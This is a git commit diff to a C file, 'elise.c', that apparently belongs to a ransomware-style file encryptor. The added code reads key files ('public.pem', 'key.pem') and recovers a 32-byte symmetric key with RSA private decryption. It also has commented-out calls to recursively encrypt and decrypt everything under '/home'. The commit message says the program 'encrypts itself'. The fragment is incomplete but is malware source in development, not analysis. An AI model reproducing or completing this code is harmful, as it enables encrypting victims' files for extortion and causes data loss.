24ab63c7c6cdd6278cb85d797d4251e2b6503c40
emil <emilcentiu@gmail.com>
2018-12-31 09:03:55 +0200

    done but it encrypts itself

--- elise.c
+++ elise.c
@@ -35,11 +35,44 @@ void encrypt(){
     FILE *k = fopen("public.pem", "wb");
     fprintf(k, "%d!%s", ki.id, d);
     fclose(k);
+    //printf("%d\n\n%s", kd.id, kd.key);
     //free(d);
 }
 
-void decrypt(){
+bool existKey(){
+    FILE *f = fopen("public.pem", "rb");
+    if(f == NULL)
+        return false;
+    fclose(f);
+    return true;
+}
 
+bool getKey(unsigned char *key){
+    FILE *f = fopen("key.pem", "rb");
+    if(f == NULL)
+        return false;
+    char ch;
+    ch = fgetc(f);
+    int l = 0;
+    while(!feof(f)){
+        key[l] = ch;
+        l++;
+        ch = fgetc(f);
+    }
+    fclose(f);
+    return true;
+}
+
+void decrypt(){
+    key_id ki;
+    extractId(&ki);
+    unsigned char key[3000];
+    getKey(key);
+    //newKey(key);
+    //scanAndCrypt("/home", key, true);
+    unsigned char d[32];
+    private_decrypt(ki.key, 32, key, d);
+    //scanAndCrypt("/home", d, false);
 }
 
 int main(int n, char *args[n]){
